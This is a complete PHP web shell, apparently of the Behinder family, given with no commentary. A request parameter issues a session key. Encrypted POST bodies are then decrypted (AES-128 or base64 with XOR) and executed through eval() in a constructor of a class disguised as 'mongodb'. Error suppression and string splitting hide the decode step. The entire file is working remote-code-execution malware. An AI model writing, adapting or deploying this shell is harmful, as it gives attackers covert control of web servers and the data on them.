<?php
@error_reporting(0);
session_start();
if (isset($_REQUEST['xxaxx']))
{
    $key=(string)substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
	$asidjaisdjija=(string)(string)file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="bas"."e64_decode";
		$asidjaisdjija=$t($asidjaisdjija."");
		
		for($i=0;$i<strlen($asidjaisdjija);$i++) {
    			 $asidjaisdjija[$i] = $asidjaisdjija[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$asidjaisdjija=(string)openssl_decrypt($asidjaisdjija, 'AES128', $key);
	}
    $arr=explode('|',$asidjaisdjija);
    $func=$arr[0];
    $params=$arr[1];
	class mongodb{public function __construct($xx) {eval ($xx."");}}
	@new mongodb($params);
}
?>